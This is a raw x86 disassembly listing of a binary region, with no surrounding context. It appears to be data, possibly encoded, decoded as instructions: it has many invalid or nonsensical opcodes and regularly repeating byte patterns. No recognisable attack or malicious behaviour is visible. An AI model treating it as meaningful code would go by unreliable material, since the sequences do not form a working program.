  40b592:	adc    BYTE PTR [edx+0x40],ah
  40b595:	inc    ecx
  40b596:	and    eax,0x40000500
  40b59b:	inc    ebx
  40b59c:	add    eax,0x40624041
  40b5a1:	inc    ebx
  40b5a2:	add    eax,0x43402541
  40b5a7:	bound  eax,QWORD PTR [eax+0x43]
  40b5aa:	int3   
  40b5ab:	inc    eax
  40b5ac:	bound  eax,QWORD PTR [eax]
  40b5ae:	inc    ecx
  40b5af:	inc    eax
  40b5b0:	inc    eax
  40b5b1:	add    eax,0x3b404c05
  40b5b6:	xor    al,0x44
  40b5b8:	or     eax,0x30d2c0e2
  40b5bd:	icebp  
  40b5be:	mov    eax,0x7b05c940
  40b5c3:	xor    al,BYTE PTR [eax+0x6b]
  40b5c6:	bound  eax,QWORD PTR [esi+0x26]
  40b5c9:	xchg   BYTE PTR [ebx],ah
  40b5cb:	mov    esi,0x38c4ee73
  40b5d0:	inc    edx
  40b5d1:	das    
  40b5d2:	jnp    0x40b62c
  40b5d4:	inc    eax
  40b5d5:	mov    ds:0xe1b53e4f,al
  40b5da:	push   es
  40b5db:	shl    DWORD PTR [ecx-0x8],1
  40b5de:	push   0x7b0590a8
  40b5e3:	bound  eax,QWORD PTR [eax+0x25]
  40b5e6:	add    BYTE PTR [esi+0x40],ah
  40b5e9:	add    eax,0x40404143
  40b5ee:	inc    ebx
  40b5ef:	add    BYTE PTR [eax],al
  40b5f1:	add    BYTE PTR [edx-0x34],ah
  40b5f4:	inc    eax
  40b5f5:	add    eax,0x40004041
  40b5fa:	inc    ecx
  40b5fb:	int3   
  40b5fc:	add    BYTE PTR [ebx-0x7c],al
  40b5ff:	add    eax,0x5406240
  40b604:	bound  edx,QWORD PTR [ebx+0x40]
  40b607:	cmp    bl,BYTE PTR [edx+0x69866240]
  40b60d:	xor    DWORD PTR [eax-0x6d59dac],eax
  40b613:	xor    BYTE PTR [ebx+0x76],bh
  40b616:	jp     0x40b5ed
  40b618:	mov    ah,0x10
  40b61a:	out    dx,al
  40b61b:	loopne 0x40b669
  40b61d:	aam    0x3e
  40b61f:	dec    DWORD PTR ds:0x7a059bac
  40b625:	sub    al,0x40
  40b627:	or     cl,cl
  40b629:	add    eax,0x46af8606
  40b62e:	cmp    al,dl
  40b630:	test   ch,0x56
  40b633:	inc    eax
  40b634:	jp     0x40b5c7
  40b636:	push   0x45
  40b638:	add    edx,DWORD PTR [edx]
  40b63a:	in     al,dx
  40b63b:	xor    BYTE PTR [edx+0x5862406c],dl
  40b641:	inc    ecx
  40b642:	add    eax,0x40404340
  40b647:	inc    ebx
  40b648:	inc    eax
  40b649:	test   BYTE PTR [eax],al
  40b64b:	add    eax,0x40624041
  40b650:	inc    eax
  40b651:	add    BYTE PTR [edx+0x5],ah
  40b654:	inc    ebx
  40b655:	add    BYTE PTR [eax+0x78],al
  40b658:	inc    ecx
  40b659:	add    BYTE PTR [eax+0x41],bl
  40b65c:	bound  eax,QWORD PTR [eax+0x40]
  40b65f:	arpl   WORD PTR [ebp+edx*1+0x33f37a40],si
  40b666:	pop    ss
  40b667:	mov    dh,0x15
  40b669:	sbb    BYTE PTR [eax-0xb],al
  40b66c:	push   edx
  40b66d:	or     dl,BYTE PTR [ebx-0x50]
  40b670:	int    0x42
  40b672:	jmp    0xb662:0x324b337a
  40b679:	push   esp
  40b67a:	hlt    
  40b67b:	fadd   DWORD PTR [ecx+0x2a]
  40b67e:	inc    edi
  40b67f:	or     BYTE PTR ds:0x717a62fa,0x41
  40b686:	daa    
  40b687:	add    eax,0x3b05ea4b
  40b68c:	inc    eax
  40b68d:	test   BYTE PTR [eax],al
  40b68f:	int3   
  40b690:	bound  eax,QWORD PTR ds:0xcc840f41
  40b696:	inc    ebx
  40b697:	add    BYTE PTR [eax+0x0],al
  40b69a:	inc    eax
  40b69b:	inc    eax
  40b69c:	inc    eax
  40b69d:	int3   
  40b69e:	add    BYTE PTR ds:0x62404341,al
  40b6a4:	pop    eax
  40b6a5:	add    BYTE PTR [ebx+0x40],al
  40b6a8:	bound  ecx,QWORD PTR [edi]
  40b6aa:	inc    eax
  40b6ab:	scas   eax,DWORD PTR es:[edi]
  40b6ac:	push   esi
  40b6ad:	(bad)
  40b6b0:	or     eax,0x400b7a87
  40b6b5:	stos   DWORD PTR es:[edi],eax
  40b6b6:	dec    edi
  40b6b7:	ror    cl,0xec
  40b6ba:	push   ds
  40b6bb:	pop    ss
  40b6bc:	pop    ss
  40b6bd:	dec    esi
  40b6be:	xor    eax,0x7aa22646
  40b6c3:	int3   
  40b6c4:	xor    dh,BYTE PTR [esi+0x43]
  40b6c7:	stc    
  40b6c8:	add    BYTE PTR [eax],al
  40b6ca:	inc    eax
  40b6cb:	inc    eax
  40b6cc:	cmovno eax,DWORD PTR ds:0x40056243
  40b6d3:	int3   
  40b6d4:	add    ah,cl
  40b6d6:	inc    eax
  40b6d7:	inc    eax
  40b6d8:	bound  eax,QWORD PTR [ecx+0x0]
  40b6db:	add    BYTE PTR [edi],cl
  40b6dd:	inc    ebx
  40b6de:	inc    eax
  40b6df:	inc    eax
  40b6e0:	add    BYTE PTR [ecx+0x43],al
  40b6e3:	add    eax,0x40256240
  40b6e8:	bound  eax,QWORD PTR [eax]
  40b6ea:	inc    edx
  40b6eb:	bound  eax,QWORD PTR [ecx]
  40b6ed:	ja     0x40b72f
  40b6ef:	jg     0x40b739
  40b6f1:	mov    ah,0xb1
  40b6f3:	lods   al,BYTE PTR ds:[esi]
  40b6f4:	jp     0x40b76d
  40b6f6:	add    esp,ebx
  40b6f8:	cmp    eax,0x64c13805
  40b6fd:	fwait
  40b6fe:	int3   
  40b6ff:	dec    ecx
  40b700:	ret    
  40b701:	leave  
  40b702:	push   edx
  40b703:	inc    edx
  40b704:	jp     0x40b6d1
  40b706:	add    eax,0x4140cc00
  40b70b:	inc    eax
  40b70c:	inc    ebx
  40b70d:	bound  esp,QWORD PTR ds:0x41400043
  40b713:	add    BYTE PTR [eax],al
  40b715:	add    eax,0x43624062
  40b71a:	inc    ecx
  40b71b:	inc    eax
  40b71c:	inc    eax
  40b71d:	inc    eax
  40b71e:	add    eax,0x40624340
  40b723:	add    eax,0x40664140
  40b728:	inc    eax
  40b729:	inc    esi
  40b72a:	push   ebp
  40b72b:	es stc 
  40b72d:	mov    esi,0xe9391647
  40b732:	stos   DWORD PTR es:[edi],eax
  40b733:	inc    eax
  40b734:	call   0x405430a2
  40b739:	inc    edx
  40b73a:	mov    ah,0x40
  40b73c:	daa    
  40b73d:	mov    edi,0x2d2c5aaa
  40b742:	adc    eax,0x79bf5641
  40b747:	dec    esp
  40b749:	rol    DWORD PTR [ebx+0x0],cl
  40b74c:	add    eax,0x41107840
  40b751:	bound  eax,QWORD PTR [eax+0x40]
  40b754:	sldt   WORD PTR [eax-0x34]
  40b758:	js     0x40b7bc
  40b75a:	add    eax,0x40664143
  40b75f:	inc    ebx
  40b760:	add    BYTE PTR [ecx+0x5],al
  40b763:	js     0x40b7a5
  40b765:	bound  eax,QWORD PTR [eax+0x0]
  40b768:	inc    eax
  40b769:	leave  
  40b76a:	inc    esp
  40b76b:	fs scas eax,DWORD PTR es:[edi]
  40b76d:	lea    esp,[ebp+0x40]
  40b770:	dec    edx
  40b771:	dec    ebx
  40b772:	clc    
  40b773:	sbb    al,0xc8
  40b775:	jns    0x40b791
  40b777:	push   ecx
  40b778:	xor    eax,0xa8f80af6
  40b77d:	lock and eax,0x49042a2d
  40b783:	xor    eax,DWORD PTR [edx+0x79]
  40b786:	mov    dh,0x41
  40b788:	inc    ebx
  40b789:	inc    eax
  40b78a:	inc    eax
  40b78b:	add    eax,0x434162
  40b790:	inc    eax
  40b791:	add    BYTE PTR [edx+0x5],ah
  40b794:	inc    eax
  40b795:	adc    BYTE PTR [edx+0x40],ah
  40b798:	inc    ebx
  40b799:	inc    ecx
  40b79a:	add    eax,0x4340
  40b79f:	add    eax,0x404162
  40b7a4:	add    BYTE PTR [eax+0x43],al
  40b7a7:	inc    eax
  40b7a8:	add    eax,0x6463e3cc
  40b7ad:	inc    BYTE PTR [ebx]
  40b7af:	sar    DWORD PTR [edi],cl
  40b7b1:	inc    eax
  40b7b2:	fmul   st(5),st
  40b7b4:	rol    BYTE PTR [edx],1
  40b7b6:	jl     0x40b831
  40b7b8:	mov    edi,0xb824ac26
  40b7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7be:	ins    BYTE PTR es:[edi],dx
  40b7bf:	ss dec esp
  40b7c1:	les    esp,FWORD PTR [ebx]
  40b7c3:	in     al,0x5
  40b7c5:	fs inc ecx
  40b7c7:	jns    0x40b77d
  40b7c9:	inc    ecx
  40b7ca:	mov    dl,0xd
  40b7cc:	leave  
  40b7cd:	dec    esi
  40b7ce:	lods   al,BYTE PTR ds:[esi]
  40b7cf:	sbb    DWORD PTR [esi],ebp
  40b7d1:	or     al,0x66
  40b7d3:	int    0xbf
  40b7d5:	cmp    al,0xa0
  40b7d7:	jns    0x40b81b
  40b7d9:	inc    eax
  40b7da:	fist   DWORD PTR [ecx-0x41]
  40b7dd:	addr16 addr16 jl 0x40b832
  40b7e1:	das    
  40b7e2:	and    al,0x35
  40b7e4:	ficomp DWORD PTR [eax]
  40b7e6:	inc    eax
  40b7e7:	add    BYTE PTR [eax],al
  40b7e9:	inc    ecx
  40b7ea:	inc    ebx
  40b7eb:	add    eax,0x41784062
  40b7f0:	inc    eax
  40b7f1:	inc    eax
  40b7f2:	add    BYTE PTR [edi],cl
  40b7f4:	bound  eax,QWORD PTR [ebx+0x0]
  40b7f7:	add    eax,0x25006240
  40b7fc:	inc    eax
  40b7fd:	add    eax,0x40254143
  40b802:	add    eax,0x79620000
  40b807:	jns    0x40b7ff
  40b809:	pop    esp
  40b80a:	add    BYTE PTR [edx+0x18],0x51
  40b80e:	arpl   WORD PTR [edi+0x33],bx
  40b811:	inc    eax
  40b812:	lock test BYTE PTR [eax+0x687987dd],ch
  40b819:	pusha  
  40b81a:	sbb    ebp,DWORD PTR [eax+0x4392]
  40b820:	add    BYTE PTR [ecx+0x40],al
  40b823:	bound  esp,QWORD PTR [esi+0x0]
  40b826:	inc    eax
  40b827:	add    eax,0x5400000
  40b82c:	inc    ecx
  40b82d:	inc    eax
  40b82e:	inc    eax
  40b82f:	bound  esp,QWORD PTR ds:0x25050043
  40b835:	inc    ecx
  40b836:	inc    ebx
  40b837:	inc    eax
  40b838:	test   BYTE PTR [eax+0x0],al
  40b83b:	bound  ebx,QWORD PTR [eax+0x62]
  40b83e:	inc    ecx
  40b83f:	inc    eax
  40b840:	inc    ebp
  40b841:	in     al,0x42
  40b843:	jg     0x40b85f
  40b845:	sahf   
  40b846:	bound  edi,QWORD PTR [edi+0x6878ac4c]
  40b84c:	inc    eax
  40b84d:	out    dx,al
  40b84e:	ins    BYTE PTR es:[edi],dx
  40b84f:	inc    eax
  40b850:	js     0x40b8b3
  40b852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b853:	jg     0x40b8d0
  40b855:	pop    ebp
  40b856:	stos   DWORD PTR es:[edi],eax
  40b857:	inc    eax
  40b858:	inc    ebx
  40b859:	fnstcw WORD PTR [eax+0x33]
  40b85c:	adc    al,0x6c
  40b85e:	mov    ah,0x41
  40b860:	enter  0x88b4,0xb7
  40b864:	inc    eax
  40b865:	cdq    
  40b866:	add    eax,0x78051f0c
  40b86b:	lahf   
  40b86c:	es fmulp st(1),st
  40b86f:	shr    BYTE PTR [eax],1
  40b871:	leave  
  40b872:	jmp    0x40b8dc
  40b874:	inc    eax
  40b875:	retf   
  40b876:	adc    BYTE PTR [edx+0x40],ah
  40b879:	inc    ecx
  40b87a:	and    eax,0x40000500
  40b87f:	inc    ebx
  40b880:	add    eax,0x40624041
  40b885:	inc    ebx
  40b886:	add    eax,0x43402541
  40b88b:	bound  eax,QWORD PTR [eax+0x43]
  40b88e:	int3   
  40b88f:	inc    eax
  40b890:	bound  eax,QWORD PTR [eax]
  40b892:	inc    ecx
  40b893:	inc    eax
  40b894:	inc    eax
  40b895:	add    eax,0x43cbc005
  40b89a:	pop    esp
  40b89b:	js     0x40b8bc
  40b89d:	and    eax,0xc8bf43f5
  40b8a2:	inc    ecx
  40b8a3:	into   
  40b8a4:	push   0xbfe39008
  40b8a9:	add    eax,0x401f7843
  40b8ae:	pop    esp
  40b8b0:	or     esp,DWORD PTR [esp+ebp*1]
  40b8b3:	xor    DWORD PTR [ecx],esi
  40b8b5:	jp     0x40b928
  40b8b7:	(bad)  
  40b8b8:	cmc    
  40b8b9:	fnsave [esi+0x78]
  40b8bc:	xor    eax,0xa8208262
  40b8c1:	inc    esp
  40b8c2:	dec    ebx
  40b8c3:	adc    al,0x2f
  40b8c5:	inc    eax
  40b8c6:	xchg   edi,eax
  40b8c7:	aad    0x11
  40b8c9:	sub    dl,BYTE PTR [esi+0x78]
  40b8cc:	jae    0x40b930
  40b8ce:	inc    eax
  40b8cf:	and    eax,0x5406600
  40b8d4:	inc    ebx
  40b8d5:	inc    ecx
  40b8d6:	inc    eax
  40b8d7:	inc    eax
  40b8d8:	inc    ebx
  40b8d9:	add    BYTE PTR [eax],al
  40b8db:	add    BYTE PTR [edx-0x34],ah
  40b8de:	inc    eax
  40b8df:	add    eax,0x40004041
  40b8e4:	inc    ecx
  40b8e5:	int3   
  40b8e6:	add    BYTE PTR [ebx-0x7c],al
  40b8e9:	add    eax,0x5406240
  40b8ee:	bound  ebp,QWORD PTR [esi]
  40b8f0:	mov    edi,0xd68fac48
  40b8f5:	ja     0x40b914
  40b8f7:	inc    eax
  40b8f8:	out    0x3d,eax
  40b8fa:	or     eax,0xd1784012
  40b8ff:	daa    
  40b900:	sbb    al,0xc3
  40b902:	int    0x62
  40b904:	inc    esp
  40b905:	pop    edx
  40b906:	sub    eax,DWORD PTR [eax-0xd]
  40b909:	and    DWORD PTR [eax],edx
  40b90b:	bound  ebp,QWORD PTR [eax+0x77]
  40b90e:	inc    eax
  40b90f:	bound  ebx,QWORD PTR [eax+0x41]
  40b912:	add    eax,0x40404340
  40b917:	inc    ebx
  40b918:	inc    eax
  40b919:	test   BYTE PTR [eax],al
  40b91b:	add    eax,0x40624041
  40b920:	inc    eax
  40b921:	add    BYTE PTR [edx+0x5],ah
  40b924:	inc    ebx
  40b925:	add    BYTE PTR [eax+0x78],al
  40b928:	inc    ecx
  40b929:	add    BYTE PTR [eax+0x41],bl
  40b92c:	(bad)  
  40b92d:	fldcw  WORD PTR [ecx]
  40b92f:	sub    dl,BYTE PTR [ebx-0x42bfdeb8]
  40b935:	ins    BYTE PTR es:[edi],dx
  40b936:	inc    eax
  40b937:	inc    esp
  40b938:	js     0x40b93f
  40b93a:	shr    DWORD PTR [edx],1
  40b93c:	ja     0x40b933
  40b93e:	sub    al,0x6b
  40b940:	and    bl,cl
  40b942:	ja     0x40b99f
  40b944:	mov    al,ds:0x65f44043
  40b949:	xor    ah,cl
  40b94b:	inc    ebp
  40b94c:	ja     0x40b99f
  40b94e:	inc    eax
  40b94f:	sbb    dl,BYTE PTR [edx-0x7cc49d55]
  40b955:	mov    edi,0xbc6ed221
  40b95a:	rol    BYTE PTR [edx+0x77],1
  40b95d:	addr16 inc eax
  40b95f:	repnz rol DWORD PTR ds:0x73e63c43,0x6d
  40b967:	std    
  40b968:	inc    eax
  40b969:	test   BYTE PTR [eax],al
  40b96b:	int3   
  40b96c:	bound  eax,QWORD PTR ds:0xcc840f41
  40b972:	inc    ebx
  40b973:	add    BYTE PTR [eax+0x0],al
  40b976:	inc    eax
  40b977:	inc    eax
  40b978:	inc    eax
  40b979:	int3   
  40b97a:	add    BYTE PTR ds:0x62404341,al
  40b980:	pop    eax
  40b981:	add    BYTE PTR [ebx+0x40],al
  40b984:	bound  ecx,QWORD PTR [edi]
  40b986:	inc    eax
  40b987:	nop
  40b988:	retf   
  40b989:	sub    DWORD PTR [edi+0x77],ecx
  40b98c:	adc    BYTE PTR [bp+di+0x4e],cl
  40b990:	inc    ebp
  40b991:	and    bh,dl
  40b993:	leave  
  40b994:	xchg   ebx,eax
  40b995:	inc    eax
  40b996:	push   0xa8a835a9
  40b99b:	ja     0x40b9ab
  40b99d:	cmp    BYTE PTR [ebp+0xd6f408e],al
  40b9a3:	sub    al,0x33
  40b9a5:	xor    dl,bh
  40b9a7:	arpl   WORD PTR [edx+esi*4+0x3b],cx
  40b9ab:	ja     0x40b9fe
  40b9ad:	inc    eax
  40b9ae:	jnp    0x40b95d
  40b9b0:	cmp    eax,0x510f6962
  40b9b5:	xor    al,0xfe
  40b9b7:	mov    ebx,es
  40b9b9:	inc    ecx
  40b9ba:	cmp    al,0x77
  40b9bc:	xchg   DWORD PTR [edx+0x15],ecx
  40b9bf:	inc    esi
  40b9c0:	add    BYTE PTR [eax],al
  40b9c2:	inc    eax
  40b9c3:	inc    eax
  40b9c4:	cmovno eax,DWORD PTR ds:0x40056243
  40b9cb:	int3   
  40b9cc:	add    ah,cl
  40b9ce:	inc    eax
  40b9cf:	inc    eax
  40b9d0:	bound  eax,QWORD PTR [ecx+0x0]
  40b9d3:	add    BYTE PTR [edi],cl
  40b9d5:	inc    ebx
  40b9d6:	inc    eax
  40b9d7:	inc    eax
  40b9d8:	add    BYTE PTR [ecx+0x43],al
  40b9db:	add    eax,0x40256240
  40b9e0:	bound  eax,QWORD PTR [eax]
  40b9e2:	inc    esi
  40b9e3:	or     DWORD PTR [ebx+0x72],edi
  40b9e6:	mov    bl,0x40
  40b9e8:	inc    ebp
  40b9e9:	mov    ch,0x34
  40b9eb:	aad    0xac
  40b9ed:	ja     0x40ba4e
  40b9ef:	bound  esp,QWORD PTR [esi-0x76]
  40b9f2:	inc    eax
  40b9f3:	jge    0x40ba57
  40b9f5:	push   ebp
  40b9f6:	jno    0x40ba38
  40b9f8:	outs   dx,DWORD PTR ds:[esi]
  40b9f9:	inc    ebx
  40b9fa:	dec    eax
  40b9fb:	dec    esp
  40b9fc:	jg     0x40ba74
  40b9fe:	xor    bh,BYTE PTR [ebp+0x62]
  40ba01:	test   eax,0x534dd3d
  40ba06:	add    ah,cl
  40ba08:	inc    eax
  40ba09:	inc    ecx
  40ba0a:	inc    eax
  40ba0b:	inc    ebx
  40ba0c:	bound  esp,QWORD PTR ds:0x41400043
  40ba12:	add    BYTE PTR [eax],al
  40ba14:	add    eax,0x43624062
  40ba19:	inc    ecx
  40ba1a:	inc    eax
  40ba1b:	inc    eax
  40ba1c:	inc    eax
  40ba1d:	add    eax,0x40624340
  40ba22:	add    eax,0x40664140
  40ba27:	mov    eax,0x884240f3
  40ba2c:	ret    
  40ba2d:	test   al,0x80
  40ba2f:	jbe    0x40ba3f
  40ba31:	and    eax,0x345c4356
  40ba36:	lds    ebx,FWORD PTR [ebx-0x5606bf8d]
  40ba3c:	inc    eax
  40ba3d:	rol    BYTE PTR [esi+esi*2-0x41],0x2c
  40ba42:	sti    
  40ba43:	xchg   BYTE PTR [ecx+0x41],cl
  40ba46:	inc    edx
  40ba47:	inc    BYTE PTR [esi+0x40]
  40ba4a:	dec    ebx
  40ba4b:	xchg   esp,eax
  40ba4c:	add    BYTE PTR [ebx+0x0],0x5
  40ba50:	inc    eax
  40ba51:	js     0x40ba63
  40ba53:	inc    ecx
  40ba54:	bound  eax,QWORD PTR [eax+0x40]
  40ba57:	sldt   WORD PTR [eax-0x34]
  40ba5b:	js     0x40babf
  40ba5d:	add    eax,0x40664143
  40ba62:	inc    ebx
  40ba63:	add    BYTE PTR [ecx+0x5],al
  40ba66:	js     0x40baa8
  40ba68:	bound  eax,QWORD PTR [eax+0x0]
  40ba6b:	inc    eax
  40ba6c:	cmp    eax,0xf5f17642
  40ba71:	pop    es
  40ba72:	jno    0x40bac8
  40ba74:	cmp    edi,DWORD PTR [eax]
  40ba76:	loope  0x40baa4
  40ba78:	fs inc ebx
  40ba7a:	dec    cx
  40ba7c:	test   al,0xca
  40ba7e:	jbe    0x40ba93
  40ba80:	inc    edi
  40ba81:	mov    WORD PTR [ebp+ebx*8+0x5bc41f2e],es
  40ba88:	(bad)  
  40ba89:	dec    esp
  40ba8a:	add    eax,0x43418a41
  40ba8f:	inc    eax
  40ba90:	inc    eax
  40ba91:	add    eax,0x434162
  40ba96:	inc    eax
  40ba97:	add    BYTE PTR [edx+0x5],ah
  40ba9a:	inc    eax
  40ba9b:	adc    BYTE PTR [edx+0x40],ah
  40ba9e:	inc    ebx
  40ba9f:	inc    ecx
  40baa0:	add    eax,0x4340
  40baa5:	add    eax,0x404162
  40baaa:	add    BYTE PTR [eax+0x43],al
  40baad:	inc    eax
  40baae:	add    eax,0x36317642
  40bab3:	aaa    
  40bab4:	loop   0x40bab6
  40bab6:	bound  ecx,QWORD PTR [esi]
  40bab8:	daa    
  40bab9:	inc    ecx
  40baba:	push   edx
  40babb:	aad    0xde
  40babd:	push   0x15766a41
  40bac2:	push   ecx
  40bac3:	adc    ah,BYTE PTR [eax+edi*4+0x2a]
  40bac7:	and    cl,BYTE PTR [edx]
  40bac9:	js     0x40bb0c
  40bacb:	sub    al,bh
  40bacd:	add    eax,0x35766056
  40bad2:	cmp    DWORD PTR [edx+0x4026cb82],esp
  40bad8:	add    BYTE PTR [eax],al
  40bada:	inc    ecx
  40badb:	inc    ebx
  40badc:	add    eax,0x41784062
  40bae1:	inc    eax
  40bae2:	inc    eax
  40bae3:	add    BYTE PTR [edi],cl
  40bae5:	bound  eax,QWORD PTR [ebx+0x0]
  40bae8:	add    eax,0x25006240
  40baed:	inc    eax
  40baee:	add    eax,0x40254143
  40baf3:	add    eax,0x2d620000
  40baf8:	ins    DWORD PTR es:[edi],dx
  40baf9:	xchg   esp,eax
  40bafa:	bnd jbe 0x40bb4b
  40bafd:	inc    esp
  40bafe:	dec    edx
  40baff:	bound  esi,QWORD PTR [esi+0x11]
  40bb02:	mov    ch,0x65
  40bb04:	stos   BYTE PTR es:[edi],al
  40bb05:	inc    ecx
  40bb06:	cmp    al,0x4d
  40bb08:	push   eax
  40bb09:	and    al,0xc
  40bb0b:	das    
  40bb0c:	add    BYTE PTR [ecx-0x35],0x43
  40bb10:	add    BYTE PTR [eax],al
  40bb12:	add    BYTE PTR [ecx+0x40],al
  40bb15:	bound  esp,QWORD PTR [esi+0x0]
  40bb18:	inc    eax
  40bb19:	add    eax,0x5400000
  40bb1e:	inc    ecx
  40bb1f:	inc    eax
  40bb20:	inc    eax
  40bb21:	bound  esp,QWORD PTR ds:0x25050043
  40bb27:	inc    ecx
  40bb28:	inc    ebx
  40bb29:	inc    eax
  40bb2a:	test   BYTE PTR [eax+0x0],al
  40bb2d:	bound  ebx,QWORD PTR [eax+0x62]
  40bb30:	inc    ecx
  40bb31:	inc    eax
  40bb32:	sub    BYTE PTR [ebp+0x33],dh
  40bb35:	mov    dl,0x92
  40bb37:	push   ebp
  40bb38:	cmp    BYTE PTR [eax+0x7c5ab3e5],ch
  40bb3e:	loopne 0x40bafd
  40bb40:	fcom   DWORD PTR [eax]
  40bb42:	xchg   esi,eax
  40bb43:	jne    0x40bb98
  40bb45:	push   ds
  40bb46:	cld    
  40bb47:	inc    eax
  40bb48:	nop
  40bb49:	test   al,0xa8
  40bb4b:	xchg   esi,eax
  40bb4c:	mov    edi,0x44402657
  40bb51:	inc    ecx
  40bb52:	adc    dh,BYTE PTR [ebp+0x2e]
  40bb55:	xchg   ecx,eax
  40bb56:	ret    
  40bb57:	inc    eax
  40bb58:	sub    ch,BYTE PTR [eax+0x48]
  40bb5b:	stc    
  40bb5c:	cmc    
  40bb5d:	inc    ebp
  40bb5e:	pop    edx
  40bb5f:	adc    BYTE PTR [edx+0x40],ah
  40bb62:	inc    ecx
  40bb63:	and    eax,0x40000500
  40bb68:	inc    ebx
  40bb69:	add    eax,0x40624041
  40bb6e:	inc    ebx
  40bb6f:	add    eax,0x43402541
  40bb74:	bound  eax,QWORD PTR [eax+0x43]
  40bb77:	int3   
  40bb78:	inc    eax
  40bb79:	bound  eax,QWORD PTR [eax]
  40bb7b:	inc    ecx
  40bb7c:	inc    eax
  40bb7d:	inc    eax
  40bb7e:	add    eax,0xccb4905
  40bb83:	inc    edx
  40bb84:	jne    0x40bbb0
  40bb86:	mov    ah,0x8b
  40bb88:	inc    ecx
  40bb89:	mov    eax,0x93dc2862
  40bb8e:	bound  esp,QWORD PTR [ecx]
  40bb90:	repz add eax,0x6a75b454
  40bb96:	inc    edx
  40bb97:	repz call 0x3fa3e666
  40bb9d:	xchg   ecx,eax
  40bb9e:	xor    ah,cl
  40bba0:	bound  ecx,QWORD PTR [eax+0x29]
  40bba3:	int    0x75
  40bba5:	popa   
  40bba6:	ja     0x40bbae
  40bba8:	lds    eax,FWORD PTR [edx+0x63]
  40bbab:	adc    BYTE PTR [edx],ah
  40bbad:	repz inc eax
  40bbaf:	sub    DWORD PTR [edi+0x75b07742],eax
  40bbb5:	outs   dx,BYTE PTR ds:[esi]
  40bbb6:	add    edi,esi
  40bbb8:	cld    
  40bbb9:	sub    al,0x63
  40bbbb:	add    eax,0x40629505
  40bbc0:	and    eax,0x5406600
  40bbc5:	inc    ebx
  40bbc6:	inc    ecx
  40bbc7:	inc    eax
  40bbc8:	inc    eax
  40bbc9:	inc    ebx
  40bbca:	add    BYTE PTR [eax],al
  40bbcc:	add    BYTE PTR [edx-0x34],ah
  40bbcf:	inc    eax
  40bbd0:	add    eax,0x40004041
  40bbd5:	inc    ecx
  40bbd6:	int3   
  40bbd7:	add    BYTE PTR [ebx-0x7c],al
  40bbda:	add    eax,0x5406240
  40bbdf:	bound  eax,QWORD PTR [edx+0x39]
  40bbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe3:	mov    cl,0xd1
  40bbe5:	inc    ecx
  40bbe6:	jne    0x40bc49
  40bbe8:	adc    BYTE PTR [ecx-0x11],dh
  40bbeb:	(bad)  
  40bbed:	jnp    0x40bc57
  40bbef:	rcl    DWORD PTR [ecx+0x55a8622e],1
  40bbf5:	call   0xce42896f
  40bbfa:	jae    0x40bc0e
  40bbfc:	nop
  40bbfd:	dec    bx
  40bbff:	adc    eax,DWORD PTR [edi-0x51]
  40bc02:	xchg   esp,eax
  40bc03:	inc    ecx
  40bc04:	pop    eax
  40bc05:	std    
  40bc06:	je     0x40bc5d
  40bc08:	inc    eax
  40bc09:	bound  ebx,QWORD PTR [eax+0x41]
  40bc0c:	add    eax,0x40404340
  40bc11:	inc    ebx
  40bc12:	inc    eax
  40bc13:	test   BYTE PTR [eax],al
  40bc15:	add    eax,0x40624041
  40bc1a:	inc    eax
  40bc1b:	add    BYTE PTR [edx+0x5],ah
  40bc1e:	inc    ebx
  40bc1f:	add    BYTE PTR [eax+0x78],al
  40bc22:	inc    ecx
  40bc23:	add    BYTE PTR [eax+0x41],bl
  40bc26:	bound  esi,QWORD PTR [eax-0x18]
  40bc29:	push   ebp
  40bc2a:	jb     0x40bc4d
  40bc2c:	aam    0xae
  40bc2e:	shl    DWORD PTR [ebp+0x27],1
  40bc31:	push   0x7477dd3c
  40bc36:	mov    edi,0x48589f40
  40bc3b:	inc    edx
  40bc3c:	les    edx,FWORD PTR [ecx+0x844063]
  40bc42:	int3   
  40bc43:	bound  eax,QWORD PTR ds:0xcc840f41
  40bc49:	inc    ebx
  40bc4a:	add    BYTE PTR [eax+0x0],al
  40bc4d:	inc    eax
  40bc4e:	inc    eax
  40bc4f:	inc    eax
  40bc50:	int3   
  40bc51:	add    BYTE PTR ds:0x62404341,al
  40bc57:	pop    eax
  40bc58:	add    BYTE PTR [ebx+0x40],al
  40bc5b:	bound  ecx,QWORD PTR [edi]
  40bc5d:	inc    eax
  40bc5e:	arpl   WORD PTR ds:0xcbb00dac,dx
  40bc64:	je     0x40bc77
  40bc66:	inc    eax
  40bc67:	lahf   
  40bc68:	test   bl,0x79
  40bc6b:	test   eax,0x207a4bf4
  40bc70:	dec    esi
  40bc71:	pop    edi
  40bc72:	jnp    0x40bc28
  40bc74:	je     0x40bcc7
  40bc76:	push   esp
  40bc77:	scas   eax,DWORD PTR es:[edi]
  40bc78:	add    BYTE PTR [eax],al
  40bc7a:	inc    eax
  40bc7b:	inc    eax
  40bc7c:	cmovno eax,DWORD PTR ds:0x40056243
  40bc83:	int3   
  40bc84:	add    ah,cl
  40bc86:	inc    eax
  40bc87:	inc    eax
  40bc88:	bound  eax,QWORD PTR [ecx+0x0]
  40bc8b:	add    BYTE PTR [edi],cl
  40bc8d:	inc    ebx
  40bc8e:	inc    eax
  40bc8f:	inc    eax
  40bc90:	add    BYTE PTR [ecx+0x43],al
  40bc93:	add    eax,0x40256240
  40bc98:	bound  eax,QWORD PTR [eax]
  40bc9a:	test   eax,0xd71f1934
  40bc9f:	push   es
  40bca0:	inc    DWORD PTR [ebx-0x44577f0c]
  40bca6:	je     0x40bcfb
  40bca8:	add    DWORD PTR [ecx],eax
  40bcaa:	adc    eax,0x3af955c5
  40bcaf:	pusha  
  40bcb0:	dec    esp
  40bcb1:	inc    esp
  40bcb2:	dec    edi
  40bcb3:	inc    esp
  40bcb4:	inc    ecx
  40bcb5:	jl     0x40bd2b
  40bcb7:	jo     0x40bd0d
  40bcb9:	cmp    ch,dh
  40bcbb:	inc    ebp
  40bcbc:	inc    ebx
  40bcbd:	sbb    ax,0x652d
  40bcc1:	and    dl,bh
  40bcc3:	inc    edi
  40bcc4:	jl     0x40bd30
  40bcc6:	je     0x40bd23
  40bcc8:	inc    esp
  40bcc9:	jbe    0x40bcd0
  40bccb:	add    ah,cl
  40bccd:	inc    eax
  40bcce:	inc    ecx
  40bccf:	inc    eax
  40bcd0:	inc    ebx
  40bcd1:	bound  esp,QWORD PTR ds:0x41400043
  40bcd7:	add    BYTE PTR [eax],al
